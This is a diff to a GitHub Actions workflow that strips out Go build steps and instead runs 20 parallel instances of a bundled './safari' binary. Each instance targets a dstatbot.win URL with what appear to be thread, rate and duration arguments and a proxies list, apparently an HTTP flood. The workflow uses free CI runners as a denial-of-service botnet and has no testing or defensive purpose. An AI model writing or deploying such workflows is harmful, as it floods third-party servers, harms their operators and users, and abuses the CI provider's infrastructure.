@@ -1,4 +1,4 @@
-name: Go Build and Run (20 Parallel Instances)
+name: Run Script (20 Parallel Instances)
 
 on:
   push:
@@ -8,7 +8,7 @@ on:
   workflow_dispatch:  # Allows manual triggering
 
 jobs:
-  build-and-run:
+  run-script:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false  # Don't cancel all if one fails
@@ -19,18 +19,9 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Set up Go
-      uses: actions/setup-go@v5
-      with:
-        go-version: '1.22'
-        cache: true
-
-    - name: Initialize Go module
-      run: go mod init test
-
-    - name: Download dependencies
+    - name: Make files executable
       run: chmod +x *
 
-    - name: Run adb.go (Instance ${{ matrix.instance }})
-      run: chmod +x * && ./safari https://c1.dstatbot.win/4WPxnBZT 700 100000 90 proxies.txt --raw 
+    - name: Run safari script (Instance ${{ matrix.instance }})
+      run: ./safari https://c1.dstatbot.win/aQbcn9Rm 700 100000 90 proxies.txt --raw 
       continue-on-error: true
